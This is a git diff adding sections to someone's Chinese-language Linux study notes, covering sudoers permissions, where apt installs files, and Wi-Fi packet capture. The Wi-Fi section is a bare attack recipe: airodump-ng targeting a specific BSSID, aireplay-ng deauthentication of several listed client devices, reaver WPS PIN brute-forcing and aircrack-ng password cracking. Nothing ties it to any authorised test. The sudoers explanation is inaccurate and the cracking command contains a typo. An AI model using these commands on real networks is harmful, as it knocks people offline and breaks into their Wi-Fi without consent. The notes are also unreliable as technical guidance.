@@ -293,3 +293,43 @@ vi  \~/.bashrc
 ![](2022-05-24-22-08-17-image.png)
 
 ![](2022-05-24-22-09-44-image.png)
+
+### linux sudoers文件
+
+这个文件是记录root用户权限的，权限必须是只读，如果改了，则再也不能切换root用户。所以在切换普通用户之前要把权限改回来。
+
+如果是wsl改不回来了，可以在win中创建一个只读文件传进去。
+
+### apt
+
+apt命令安装的tomcat，它的很多组件是分开存储的。  
+
+下载的软件的存放位置：/var/cache/apt/archives  
+安装后软件的默认位置：/usr/share  
+可执行文件位置：/usr/bin  
+配置文件位置：/etc  
+lib文件位置：/usr/lib
+
+### linux 抓包
+
+#scan wifi list
+airodump-ng wlan0mon
+
+#capture wifi    
+airodump-ng --bssid F4:83:CD:B5:84:19 -c 1 -w /home/ wlan0mon 
+
+#open another terminal,break a link
+
+aireplay-ng -0 8 -c 66:9C:A1:A0:38:9F -a F4:83:CD:B5:84:19 wlan0mon
+aireplay-ng -0 8 -c 14:16:9E:3A:EA:C7 -a F4:83:CD:B5:84:19 wlan0mon
+aireplay-ng -0 8 -c 28:02:D8:06:FB:B6 -a F4:83:CD:B5:84:19 wlan0mon
+
+#pin 
+airodump-ng wlan0mon
+#scan wps
+wash -i wlan0mon
+#attack
+reaver -i wlan0mon -b (bssid) -vv -c (CH) 
+
+#kali 自带解包
+ircrack-ng -w pass.txt freedom-*.ivs
